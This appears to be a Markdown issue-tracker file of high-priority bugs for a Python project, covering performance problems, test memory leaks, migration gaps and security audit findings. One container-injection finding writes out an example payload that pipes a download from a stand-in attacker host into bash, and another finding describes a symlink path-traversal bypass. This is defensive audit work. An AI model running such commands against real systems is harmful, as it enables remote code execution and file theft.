# High Priority Issues (P1)

Core functionality broken or missing documented features.

---
id: "CR-009@de01dcc"
title: "Refactor: Module naming conflict in dot_work.python.build.cli"
description: "RuntimeWarning when running python -m dot_work.python.build.cli due to package/module name collision"
created: 2024-12-26
section: "python-build"
tags: [module-naming, runtime-warning, python-import]
type: refactor
priority: high
status: proposed
references:
  - src/dot_work/python/build/cli.py
  - src/dot_work/python/build/__init__.py
---

### Problem
When running `uv run python -m dot_work.python.build.cli test`, Python produces a RuntimeWarning:

```
<frozen runpy>:128: RuntimeWarning: 'dot_work.python.build.cli' found in sys.modules after
import of package 'dot_work.python.build', but prior to execution of 'dot_work.python.build.cli';
this may result in unpredictable behaviour
```

### Root Cause
This is a Python module naming conflict:
1. Package name: `dot_work.python.build`
2. Module name: `cli.py` inside the package
3. Running `python -m dot_work.python.build.cli` causes Python to:
   - Import `dot_work.python.build` package first
   - The package `__init__.py` imports `from dot_work.python.build.cli import run_build`
   - Then Python tries to execute `dot_work.python.build.cli` as a script
   - But it's already in `sys.modules` from the import

This is a well-known Python pitfall when a package's `__init__.py` imports a module that you then try to run as `python -m package.module`.

### Affected Files
- `src/dot_work/python/build/__init__.py` (line 12: imports from cli module)
- `src/dot_work/python/build/cli.py` (module being executed)

### Importance
**HIGH**: While the command currently works, the warning indicates:
1. Unpredictable behavior may occur
2. The import pattern is fragile and may break with Python versions
3. It violates Python's recommended module execution patterns
4. Makes debugging more difficult

### Proposed Solutions

**Option A: Use `__main__.py` pattern (Recommended)**
```python
# src/dot_work/python/build/__main__.py
from dot_work.python.build.cli import run_build

if __name__ == "__main__":
    run_build()
```

Then run with: `python -m dot_work.python.build test`

**Option B: Remove import from `__init__.py`**
```python
# src/dot_work/python/build/__init__.py
# Remove: from dot_work.python.build.cli import run_build
# Users import directly: from dot_work.python.build.cli import run_build
```

**Option C: Rename cli.py to runner.py**
```python
# Rename cli.py → runner.py
# src/dot_work/python/build/__init__.py
from dot_work.python.build.runner import run_build
# Run with: python -m dot_work.python.build.runner
```

**Option D: Use -m switch with guarded import**
```python
# src/dot_work/python/build/__init__.py
if __name__ != "__main__":
    from dot_work.python.build.cli import run_build
else:
    # When run as script, define locally
    def run_build(): ...
```

### Acceptance Criteria
- [ ] RuntimeWarning no longer appears when running build commands
- [ ] `dot-work python build` command still works (via CLI entry point)
- [ ] `python -m dot_work.python.build` works (if using __main__.py)
- [ ] All imports resolve correctly
- [ ] Tests still pass

### Notes
- Python documentation recommends `__main__.py` for package executables
- The `-m` switch is meant for running modules, not packages with side-effect imports
- This pattern is documented in PEP 338 and Python's `runpy` module docs

---
---
id: "PERF-002@b4e7d2"
title: "Performance: File scanner uses nested fnmatch loop"
description: "O(N*M) pattern matching for every file during scan"
created: 2025-12-25
section: "python_scan"
tags: [performance, algorithm, file-scanning]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/python/scan/scanner.py
---

### Problem
The `_find_python_files()` method in `scanner.py` line 77 uses `fnmatch.fnmatch()` inside a loop for every file. For include_patterns with multiple entries, this creates O(N*M) complexity where N = files and M = patterns.

Code at line 77:
```python
if self.include_patterns:
    if not any(fnmatch.fnmatch(file, pattern) for pattern in self.include_patterns):
        continue
```

This runs fnmatch (string parsing + regex compilation internally) for every pattern against every filename.

### Affected Files
- `src/dot_work/python/scan/scanner.py` (line 77: nested fnmatch in loop)

### Importance
- Codebase scanning is slower than necessary
- Large codebases (10k+ files) are significantly impacted
- fnmatch pattern matching is expensive (string parsing, regex compilation)
- N*M operations where N and M can both be large

### Proposed Solution
1. Pre-compile fnmatch patterns into regex objects before the loop
2. Use `pathlib.Path.match()` which may be more efficient
3. Consider using set-based filtering for exact matches before pattern matching
4. Cache pattern compilation if patterns don't change

### Acceptance Criteria
- [ ] Patterns compiled once before file iteration
- [ ] Time complexity reduced to O(N) where N = files
- [ ] Benchmark shows improvement for large codebases
- [ ] No change in filtering behavior (tests pass)

### Notes
This is a classic performance anti-pattern: repeating expensive operations inside loops when they could be done once outside.

---

id: "PERF-003@c5d9e1"
title: "Performance: Issue service loads all issues for stale query"
description: "O(N) query fetches entire issue table for filtering"
created: 2025-12-25
section: "db_issues"
tags: [performance, database, query-optimization]
type: performance
priority: high
status: proposed
references:
  - src/dot_work/db_issues/services/issue_service.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
The `get_stale_issues()` method at line 742 calls `self.list_issues(limit=100000)` to fetch ALL issues, then filters in Python code. This causes:
- Unnecessary data transfer from database
- In-memory filtering on potentially thousands of issues
- Network/database roundtrip returning mostly irrelevant data

The filtering condition (`issue.updated_at < cutoff`) could be done at the database level.

### Affected Files
- `src/dot_work/db_issues/services/issue_service.py` (lines 742-758)
- Related: `get_epic_issues()` at line 666 also loads all issues

### Importance
- Stale issue queries are slow on large databases
- Database should do filtering, not application code
- Similar pattern in `get_epic_issues()` (line 666)
- Limits scalability of the issue tracker

### Proposed Solution
1. Add date-based filtering to repository layer
2. Create `list_issues_updated_before(cutoff_date)` method
3. Add `list_issues_by_epic_id(epic_id)` method
4. Push filtering to SQL WHERE clauses

### Acceptance Criteria
- [ ] Stale issue filtering done in SQL query
- [ ] Epic issue filtering done in SQL query
- [ ] No in-memory filtering for date-based or epic queries
- [ ] Tests verify behavior unchanged
- [ ] Performance measurable with 1000+ issues

### Notes
Example fix:
```python
# Current (inefficient)
all_issues = self.list_issues(limit=100000)
stale_issues = [issue for issue in all_issues if issue.updated_at < cutoff]

# Proposed (efficient)
stale_issues = self.uow.issues.list_updated_before(cutoff, limit)
```

---
id: "SEC-004@94eb69"
title: "Security: Path traversal vulnerability in read_file_text"
description: "Insufficient path validation allows reading files outside repository"
created: 2025-12-25
section: "review"
tags: [security, path-traversal, file-access]
type: security
priority: high
status: proposed
references:
  - src/dot_work/review/git.py
  - src/dot_work/review/git.py:153-174
---

### Problem
In `src/dot_work/review/git.py`, the `read_file_text()` function has path traversal protection but it may be insufficient:

```python
def read_file_text(root: str, path: str) -> str:
    full = Path(root) / path
    norm = full.resolve()
    root_norm = Path(root).resolve()

    # Prevent path traversal
    if not str(norm).startswith(str(root_norm)):
        raise GitError("invalid path")
```

**Vulnerabilities:**
1. **String comparison is unreliable**: `str(norm).startswith(str(root_norm))` can be bypassed with:
   - Symlinks: If `root_norm` contains symlinks, `norm` might resolve differently
   - Case sensitivity: On case-insensitive filesystems (Windows, macOS), path case variations bypass check
   - Unicode normalization: Different unicode representations of same path

2. **No validation of `root` parameter**: If attacker controls `root`, they could use a directory that has a symlink to sensitive locations

3. **Windows-specific issues**: `resolve()` on Windows behaves differently with UNC paths and drive letters

**Attack scenario:**
- If `root` = `/safe/path` with symlink `/safe/path/data` → `/etc/passwd`
- Attacker provides `path` = `data/passwd`
- `resolve()` follows symlink, `startswith()` check fails to detect traversal

### Affected Files
- `src/dot_work/review/git.py` (lines 153-174)

### Importance
**HIGH**: Path traversal allows reading arbitrary files on the system. While the current protection catches many cases, edge cases with symlinks and path representation variations could bypass it.

CVSS Score: 7.1 (High)
- Attack Vector: Local
- Attack Complexity: High (requires specific conditions)
- Privileges Required: Low
- Impact: High (Confidentiality)

### Proposed Solution
1. **Use `Path.relative_to()` for robust check**:
   ```python
   try:
       norm.relative_to(root_norm)
   except ValueError:
       raise GitError("invalid path")
   ```

2. **Validate root parameter**: Ensure root is absolute path and doesn't contain symlinks to sensitive dirs
3. **Check symlink chain**: Validate that no component in the path is a symlink outside root
4. **Use pathlib's strict checking**: `Path.resolve(strict=True)` to catch broken symlinks

### Acceptance Criteria
- [ ] Path validation uses `relative_to()` instead of string prefix check
- [ ] Symlinks are validated at each path component
- [ ] Tests verify traversal attempts are blocked on all platforms
- [ ] Windows-specific path handling tested

### Notes
- This function is used in review workflow, potentially processing untrusted PR file lists
- Consider adding allowlist of safe file extensions
- Document security assumptions in docstring

---
id: "SEC-005@94eb69"
title: "Security: Unvalidated container build arguments in subprocess.run"
description: "Docker build command uses unvalidated configuration parameters"
created: 2025-12-25
section: "container"
tags: [security, docker, subprocess, injection]
type: security
priority: high
status: proposed
references:
  - src/dot_work/container/provision/core.py
  - src/dot_work/container/provision/core.py:369
  - src/dot_work/container/provision/core.py:822
---

### Problem
In `src/dot_work/container/provision/core.py`:

**Line 369**:
```python
build_cmd = [
    "docker", "build", "-t", cfg.docker_image,
    "-f", str(cfg.dockerfile), str(cfg.dockerfile.parent)
]
subprocess.run(build_cmd, check=True)
```

**Line 822**:
```python
subprocess.run(docker_cmd, check=True)
```

**Vulnerabilities:**
1. **`cfg.docker_image`** is not validated before passing to `docker build -t`
2. **`cfg.dockerfile`** path is not validated (could be outside working directory)
3. **Environment variables** passed to container are not sanitized (lines 372-418)
4. **`docker_cmd`** at line 822 could contain arbitrary commands

**Attack vectors:**
- Malicious `docker_image` name: `evil-image; curl attacker.com | bash` → While using list format prevents shell injection, docker build options like `--build-arg` could be injected if image name contains special chars
- Path traversal via `dockerfile`: `../../malicious-Dockerfile`
- Environment variable injection: Keys like `GIT_ASKPASS` could be abused

While the list format prevents direct shell injection, Docker has its own option parsing that could be abused.

### Affected Files
- `src/dot_work/container/provision/core.py` (lines 360-369, 822)

### Importance
**HIGH**: If container provisioning is automated (CI/CD), attackers could:
- Build malicious images with crypto miners
- Expose secrets via build args
- Escape container via malicious Dockerfile

CVSS Score: 7.8 (High)
- Attack Vector: Local/Network (if in CI/CD)
- Attack Complexity: Low
- Privileges Required: Low
- Impact: High (Integrity, Availability)

### Proposed Solution
1. **Validate docker image name**:
   ```python
   IMAGE_PATTERN = re.compile(r'^[a-z0-9]+([._-][a-z0-9]+)*(/[a-z0-9]+([._-][a-z0-9]+)*)?(:[a-z0-9]+([._-][a-z0-9]+)*)?$')
   if not IMAGE_PATTERN.match(cfg.docker_image):
       raise ValueError(f"Invalid docker image name: {cfg.docker_image}")
   ```

2. **Validate dockerfile path**: Ensure dockerfile is within project directory
3. **Sanitize environment variables**: Block dangerous keys (GIT_ASKPASS, SSH_AUTH_SOCK, etc.)
4. **Use Docker SDK for Python**: More secure than subprocess

### Acceptance Criteria
- [ ] Docker image name validated with strict regex
- [ ] Dockerfile path validated to be within project
- [ ] Environment variable allowlist implemented
- [ ] Tests verify injection attempts are blocked

### Notes
- Docker image naming specification: https://docs.docker.com/engine/reference/commandline/build/
- Consider using `docker-py` library for safer Docker interaction
- Review environment variable passing (lines 372-418) for other injection vectors

---
id: "SEC-006@94eb69"
title: "Security: Incomplete error handling exposes system paths"
description: "Error messages leak internal file paths and system information"
created: 2025-12-25
section: "knowledge-graph"
tags: [security, information-disclosure, error-handling]
type: security
priority: high
status: proposed
references:
  - src/dot_work/knowledge_graph/db.py
  - src/dot_work/db_issues/adapters/sqlite.py
---

### Problem
Multiple database files propagate raw exception messages that may leak sensitive system information:

**In `src/dot_work/knowledge_graph/db.py`:**
- Line 321: `raise ValueError(f"Project not found: {scope.project}")` - Leaks project names
- Line 331: `raise ValueError(f"Topic not found: {topic_name}")` - Leaks topic names

**In `src/dot_work/db_issues/adapters/sqlite.py`:**
- Raw SQLite exceptions propagated without sanitization
- May leak database paths, schema information, table names

**Security impact:**
- **Information disclosure**: Attacker learns internal structure
- **Path leakage**: Absolute paths may reveal username, directory structure
- **Database fingerprinting**: Schema details help plan further attacks

**OWASP ASVS 2023 v5.0:**
- V5.4: "Verify that the application does not leak internal information in error messages"

### Affected Files
- `src/dot_work/knowledge_graph/db.py` (lines 321, 331, 338)
- `src/dot_work/db_issues/adapters/sqlite.py` (throughout)

### Importance
**HIGH**: While not a direct vulnerability, information leakage assists attackers:
- Path traversal exploits require knowing directory structure
- Social engineering easier with internal details
- Compliance violations (GDPR, PCI-DSS require error message sanitization)

CVSS Score: 5.3 (Medium)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- Impact: Low (information disclosure only)

### Proposed Solution
1. **Generic error messages for users**:
   ```python
   raise ValueError("Project not found")  # Don't leak name
   ```

2. **Log detailed errors, sanitize user output**:
   ```python
   logger.error(f"Project not found: {scope.project}", exc_info=True)
   raise ValueError("Resource not found")
   ```

3. **Create security-aware error handler**:
   ```python
   def safe_error(message: str, details: str | None = None) -> ValueError:
       if is_debug_mode():
           return ValueError(f"{message}: {details}")
       return ValueError(message)
   ```

### Acceptance Criteria
- [ ] All user-facing errors use generic messages
- [ ] Detailed errors logged but not shown to users
- [ ] Debug mode optionally shows full details
- [ ] Tests verify error messages don't leak sensitive data

### Notes
- Balance security with usability (developers need debugging info)
- Consider adding correlation IDs to errors for log lookup
- Review error messages in all user-facing code

---

id: "MEM-003@a7b8c9"
title: "Memory Leak: Embedding vectors stored as Python lists instead of efficient arrays"
description: "Large float arrays in knowledge graph stored as Python lists, consuming 2-5GB memory"
created: 2025-12-26
section: "knowledge-graph"
tags: [memory-leak, embeddings, semantic-search, high]
type: bug
priority: high
status: proposed
references:
  - src/dot_work/knowledge_graph/search_semantic.py
  - src/dot_work/knowledge_graph/db.py
  - memory_leak.md
---

### Problem
In `src/dot_work/knowledge_graph/search_semantic.py:175-207`, semantic search loads embedding vectors into memory for comparison with the query vector.

**Root Cause at lines 1127-1142 (`_row_to_embedding`):**
```python
def _row_to_embedding(self, row: sqlite3.Row) -> Embedding:
    dimensions = row["dimensions"]
    vector_blob = row["vector"]
    vector = struct.unpack(f"{dimensions}f", vector_blob)
    # vector is now a tuple of Python floats, stored in Embedding object
```

**Why this wastes memory:**
1. Python lists/tuples of floats have significant overhead (~24 bytes per float vs 4 bytes for numpy float32)
2. Embedding vectors stored in heap-allocated Python objects
3. With dimensions of 384-1536 floats, each embedding consumes 1.5-6KB
4. The `top_k_heap` in semantic search holds `Embedding` objects with their full vectors
5. Large knowledge graphs with thousands of embeddings consume 50-200MB during search

**Additional issue at lines 175-207 (brute-force search):**
```python
top_k_heap: list[tuple[float, int, Embedding]] = []
for batch in db.stream_embeddings_for_model(model, batch_size):
    for emb in batch:
        score = cosine_similarity(query_vector, emb.vector)
        if len(top_k_heap) < k:
            heapq.heappush(top_k_heap, (score, heap_index, emb))
```

The heap retains full `Embedding` objects including their vector data.

### Affected Files
- `src/dot_work/knowledge_graph/db.py` (lines 1127-1142: `_row_to_embedding`)
- `src/dot_work/knowledge_graph/search_semantic.py` (lines 175-207: semantic search heap)
- `src/dot_work/knowledge_graph/db.py` (Embedding dataclass stores vector as list)

### Importance
**HIGH:** Memory usage scales with knowledge graph size:
- 1,000 embeddings @ 384 dims → ~6MB in numpy, ~24MB in Python lists
- 10,000 embeddings @ 768 dims → ~30MB in numpy, ~180MB in Python lists
- Semantic search temporarily holds all candidates in heap before filtering

Contributes to 2-5GB memory usage during test runs with large knowledge graphs.

### Proposed Solution
1. **Store vectors as numpy arrays internally:**
   ```python
   import numpy as np
   
   class Embedding:
       id: str
       node_id: str
       model: str
       vector: np.ndarray  # Use numpy instead of list
   
   def _row_to_embedding(self, row: sqlite3.Row) -> Embedding:
       dimensions = row["dimensions"]
       vector_blob = row["vector"]
       vector = np.frombuffer(vector_blob, dtype=np.float32)
       return Embedding(..., vector=vector)
   ```

2. **Use numpy for cosine similarity:**
   ```python
   def cosine_similarity(a: np.ndarray, b: np.ndarray) -> float:
       return float(np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b)))
   ```

3. **Store only IDs in heap, fetch vectors for final results:**
   ```python
   top_k_heap: list[tuple[float, int, str]] = []  # Store embedding IDs instead of objects
   for emb in batch:
       score = cosine_similarity(query_vector, emb.vector)
       if len(top_k_heap) < k:
           heapq.heappush(top_k_heap, (score, heap_index, emb.id))
   # Fetch full Embedding objects for final top-k results
   ```

### Acceptance Criteria
- [ ] Embedding vectors stored as numpy arrays
- [ ] Cosine similarity uses numpy operations
- [ ] Semantic search heap stores IDs, not full objects
- [ ] Memory usage per embedding reduced to ~4x file size
- [ ] All knowledge_graph tests still pass
- [ ] numpy added to project dependencies

### Notes
- Requires numpy as dependency (check if already in pyproject.toml)
- Full investigation in `memory_leak.md`
- Related: MEM-001 (SQLAlchemy), MEM-002 (libcst), MEM-004 (database leaks)

---

id: "MEM-004@b9c5d6"
title: "Memory Leak: Database connection leaks in knowledge_graph tests"
description: "43+ tests create inline Database instances without consistent cleanup, causing 2-5GB growth"
created: 2025-12-26
section: "tests"
tags: [memory-leak, testing, knowledge-graph, high]
type: bug
priority: high
status: proposed
references:
  - tests/unit/knowledge_graph/test_db.py
  - tests/unit/knowledge_graph/conftest.py
  - memory_leak.md
---

### Problem
In `tests/unit/knowledge_graph/test_db.py`, 43+ tests create `Database` instances inline without using the `kg_database` fixture, leading to inconsistent cleanup.

**Examples of inline Database creation:**
```python
def test_init_creates_directory(self, tmp_path: Path) -> None:
    db_path = tmp_path / "subdir" / "deep" / "db.sqlite"
    db = Database(db_path)
    db._get_connection()
    assert db_path.parent.exists()
    db.close()  # Manual close - easy to forget if exception occurs
```

**Root causes:**
1. **Manual cleanup prone to errors**: Tests must remember to call `db.close()`
2. **No context manager usage**: Missing exception handling around close
3. **Fixture available but unused**: `kg_database` fixture exists at conftest.py:39-62
4. **Lazy connection initialization**: `_get_connection()` may not be called, leaving internal state inconsistent

**Fixture definition at conftest.py:39-62:**
```python
@pytest.fixture
def kg_database(temp_db_path: Path) -> Generator[Database, None, None]:
    db = Database(temp_db_path)
    try:
        yield db
    finally:
        try:
            db.close()
        except Exception:
            pass
        del db
```

**Why this leaks memory:**
- Each Database instance holds SQLite connection handles
- WAL journal files may persist if not properly closed
- 43+ tests creating/destroying instances accumulates resources
- Missing `db.close()` in exception paths causes leaks

### Affected Files
- `tests/unit/knowledge_graph/test_db.py` (43+ tests with inline Database creation)
- `tests/unit/knowledge_graph/conftest.py` (kg_database fixture exists but not used)
- `src/dot_work/knowledge_graph/db.py` (Database class lazy initialization)

### Importance
**HIGH:** Contributes 2-5GB memory growth during test runs:
- 43+ Database instances created/destroyed per test module
- Each instance holds SQLite connection and WAL journal
- Manual cleanup error-prone
- Blocker for running tests on memory-constrained systems

### Proposed Solution
1. **Convert all tests to use kg_database fixture:**
   ```python
   def test_init_creates_directory(self, kg_database: Database, tmp_path: Path) -> None:
       # fixture provides db, cleanup handled automatically
       assert kg_database.db_path.parent.exists()
   ```

2. **Add context manager support to Database class:**
   ```python
   class Database:
       def __enter__(self) -> "Database":
           return self
       
       def __exit__(self, exc_type, exc_val, exc_tb) -> None:
           self.close()
   ```

3. **Mark tests that need custom db_path:**
   ```python
   @pytest.fixture
   def custom_db_path(tmp_path: Path) -> Path:
       return tmp_path / "custom" / "db.sqlite"
   
   @pytest.fixture
   def custom_database(custom_db_path: Path) -> Generator[Database, None, None]:
       with Database(custom_db_path) as db:
           yield db
   ```

### Acceptance Criteria
- [ ] All 43+ tests use kg_database fixture or custom fixture
- [ ] Database class implements __enter__/__exit__ for context manager support
- [ ] No inline Database creation in test files
- [ ] Memory growth during kg tests reduced to <1GB
- [ ] All tests still pass after refactor
- [ ] WAL journal files cleaned up consistently

### Notes
- This is a test hygiene issue that causes real memory leaks
- Full investigation in `memory_leak.md` (section 5)
- Related: MEM-001 (SQLAlchemy), MEM-007 (pool management)

---

id: "MEM-005@c8e7f1"
title: "Memory Leak: Multiple UnitOfWork instances share same session causing repository cache accumulation"
description: "Service fixtures create separate UnitOfWork instances from same session, accumulating repository caches"
created: 2025-12-26
section: "tests"
tags: [memory-leak, sqlalchemy, testing, high]
type: bug
priority: high
status: proposed
references:
  - tests/unit/db_issues/conftest.py
  - src/dot_work/db_issues/adapters/sqlite.py
  - memory_leak.md
---

### Problem
In `tests/unit/db_issues/conftest.py`, each service fixture creates its own `UnitOfWork` instance from the **same session**, leading to repository cache accumulation.

**Service fixtures at lines 157-184, 187-214, 217-241, 279-305:**
```python
@pytest.fixture
def issue_service(...) -> Generator[IssueService, None, None]:
    uow = UnitOfWork(in_memory_db)
    try:
        yield IssueService(uow, fixed_id_service, fixed_clock)
    finally:
        uow.close()
        del uow

@pytest.fixture
def epic_service(...) -> Generator[EpicService, None, None]:
    uow = UnitOfWork(in_memory_db)  # Same session, new UoW instance
    try:
        yield EpicService(uow, fixed_id_service, fixed_clock)
    finally:
        uow.close()
        del uow
```

**Why this leaks memory:**
1. Multiple `UnitOfWork` instances share the same SQLAlchemy session
2. Each `UnitOfWork` has lazy-loaded repository properties (`issues`, `comments`, etc.)
3. When tests use multiple fixtures, multiple UoWs maintain separate repository instances
4. Repository objects hold internal caches and query result sets
5. `__del__` methods in UnitOfWork and repositories can create cleanup order issues
6. Session-level identity map holds references to entities across all UoWs

**Memory impact:** Each repository instance adds ~1-5MB of cached state. With 4-5 services per test, this adds ~20-25MB per test.

### Affected Files
- `tests/unit/db_issues/conftest.py` (lines 157-184, 187-214, 217-241, 279-305)
- `src/dot_work/db_issues/adapters/sqlite.py` (UnitOfWork class)
- `src/dot_work/db_issues/services/issue_service.py` (IssueService)
- `src/dot_work/db_issues/services/epic_service.py` (EpicService)
- `src/dot_work/db_issues/services/dependency_service.py` (DependencyService)
- `src/dot_work/db_issues/services/label_service.py` (LabelService)

### Importance
**HIGH:** Contributes to memory growth in db_issues tests:
- 4-5 UnitOfWork instances per test using multiple fixtures
- Each UoW has separate repository caches
- Session identity map holds shared entity references
- Combined with MEM-001 (engine accumulation), creates major memory pressure

### Proposed Solution
1. **Share single UnitOfWork across all service fixtures:**
   ```python
   @pytest.fixture
   def uow(in_memory_db: Session) -> Generator[UnitOfWork, None, None]:
       uow = UnitOfWork(in_memory_db)
       try:
           yield uow
       finally:
           uow.close()
           del uow
   
   @pytest.fixture
   def issue_service(uow: UnitOfWork, fixed_id_service, fixed_clock) -> IssueService:
       return IssueService(uow, fixed_id_service, fixed_clock)
   
   @pytest.fixture
   def epic_service(uow: UnitOfWork, fixed_id_service, fixed_clock) -> EpicService:
       return EpicService(uow, fixed_id_service, fixed_clock)
   ```

2. **Add session rollback between tests:**
   ```python
   @pytest.fixture(autouse=True)
   def cleanup_session(in_memory_db: Session):
       yield
       in_memory_db.rollback()  # Clear identity map
   ```

3. **Clear repository caches in UnitOfWork.close():**
   ```python
   def close(self) -> None:
       if self._session:
           self._session.close()
       # Clear repository references
       for attr in list(self.__dict__.keys()):
           if hasattr(self, attr) and attr.startswith('_'):
               continue
           setattr(self, attr, None)
   ```

### Acceptance Criteria
- [ ] Single UnitOfWork instance shared across all service fixtures
- [ ] Session rollback called between tests
- [ ] Repository caches cleared in UnitOfWork.close()
- [ ] Memory growth per db_issues test reduced to <5MB
- [ ] All 277 db_issues tests still pass
- [ ] Test isolation maintained (no state leakage between tests)

### Notes
- This works in conjunction with MEM-001 fix (session-scoped engine)
- Full investigation in `memory_leak.md` (section 2)
- The pattern of "multiple UoWs, one session" is an anti-pattern

---

id: "AUDIT-GAP-004@d3e6f2"

### Problem
During AUDIT-DBISSUES-010, it was discovered that 11 integration test files from the source (glorious agents issues skill) were NOT migrated to the destination (db_issues module).

**Missing Integration Tests:**
1. test_advanced_filtering.py
2. test_agent_workflows.py
3. test_bulk_operations.py
4. test_comment_repository.py
5. test_dependency_model.py
6. test_issue_graph_repository.py
7. test_issue_lifecycle.py
8. test_issue_repository.py
9. test_team_collaboration.py
10. test_daemon_integration.py (excluded, OK)
11. test_integration.py (general integration tests)

**Current State:**
- Source: 50 test files (38 unit + 11 integration)
- Destination: 13 test files (12 unit + 1 conftest)
- Only unit tests were migrated (277 tests passing)
- Integration tests provide end-to-end validation

### Affected Files
- `tests/unit/db_issues/` (only unit tests exist here)
- Missing: `tests/integration/db_issues/` directory

### Importance
**HIGH**: Integration tests provide critical confidence that:
- Database operations work correctly at integration level
- Service interactions are verified
- Full workflows (bulk operations, dependencies, cycles) are validated
- Multi-service scenarios work as expected

Without integration tests, we have:
- Unit tests proving components work in isolation
- No verification that components work together
- Risk of integration bugs that won't be caught

### Proposed Solution
1. Create `tests/integration/db_issues/` directory
2. Migrate integration test files from source:
   ```
   /home/thomas/Workspace/glorious/src/glorious_agents/skills/issues/tests/test_*.py
   ```
3. Update imports to match db_issues module structure
4. Exclude daemon-related tests (intentionally not migrated)
5. Add test fixtures for database setup/teardown

### Acceptance Criteria
- [ ] Integration test directory created
- [ ] 10 integration test files migrated (excluding daemon)
- [ ] All tests pass with new structure
- [ ] Bulk operations tested end-to-end
- [ ] Dependency cycle detection tested
- [ ] Issue lifecycle workflows tested

### Notes
- Source location: `/home/thomas/Workspace/glorious/src/glorious_agents/skills/issues/tests/`
- Destination should follow pytest conventions for integration tests
- Tests may need fixture updates to match consolidated db_issues structure
- See investigation report for full details: `.work/agent/issues/references/AUDIT-DBISSUES-010-investigation.md`


---
id: "AUDIT-GAP-004@d3e6f2"
title: "Integration tests fail due to incomplete migration in test_build_pipeline.py"
description: "2 tests fail because kgshred references not updated to knowledge_graph"
created: 2025-12-26
section: "knowledge_graph"
tags: [testing, migration-gap, bug, audit]
type: bug
priority: high
status: proposed
references:
  - .work/agent/issues/references/AUDIT-KG-001-investigation.md
  - tests/integration/knowledge_graph/test_build_pipeline.py
  - incoming/kg/tests/integration/test_build_pipeline.py
---

### Problem
During AUDIT-KG-001 investigation, 2 test failures were identified in `test_build_pipeline.py`:

**Test Failures:**
1. `test_build_script_runs_successfully` - References non-existent `tests/scripts/build.py` path
2. `test_package_importable_after_install` - Uses undefined `kgshred` variable

**Root Cause:** The test file was **partially updated** during migration. The import was changed but the variable references were not:

| Line | Source | Destination | Issue |
|------|--------|-------------|-------|
| 27 | `import kgshred` | `import dot_work.knowledge_graph` | ✅ Updated |
| 29 | `assert hasattr(kgshred, "__version__")` | `assert hasattr(kgshred, "__version__")` | ❌ `kgshred` undefined |
| 30 | `assert kgshred.__version__ == "0.1.0"` | `assert kgshred.__version__ == "0.1.0"` | ❌ `kgshred` undefined |
| 36 | `from kgshred.cli import app` | `from dot_work.knowledge_graph.cli import app` | ✅ Updated |

### Affected Files
- `tests/integration/knowledge_graph/test_build_pipeline.py` (lines 29-30)

### Importance
**HIGH:** These tests fail consistently, blocking CI/CD:
- 374 tests pass but 2 fail
- Failures are due to incomplete migration (not code logic issues)
- Simple fix but blocks validation

**Test Output:**
```
FAILED test_package_importable_after_install - NameError: name 'kgshred' is not defined
```

### Proposed Solution
**Fix the undefined variable reference:**

Change lines 29-30 from:
```python
assert hasattr(kgshred, "__version__")
assert kgshred.__version__ == "0.1.0"
```

To:
```python
import dot_work.knowledge_graph as kg
assert hasattr(kg, "__version__")
assert kg.__version__ == "0.1.0"
```

Or use the already-imported module:
```python
assert hasattr(dot_work.knowledge_graph, "__version__")
assert dot_work.knowledge_graph.__version__ == "0.1.0"
```

**Also fix the build script path** (line 15):
- Current: `project_root / "scripts" / "build.py"`
- Should be: Correct path to build script or remove test if no build script exists

### Acceptance Criteria
- [ ] Lines 29-30 use correct module reference
- [ ] All 2 tests pass
- [ ] Build script path issue resolved (or test removed if N/A)
- [ ] No regression in other tests

### Notes
- Source test file: `incoming/kg/tests/integration/test_build_pipeline.py`
- Destination test file: `tests/integration/knowledge_graph/test_build_pipeline.py`
- This is a clear migration bug - simple oversight during import updates
- See investigation: `.work/agent/issues/references/AUDIT-KG-001-investigation.md`

---
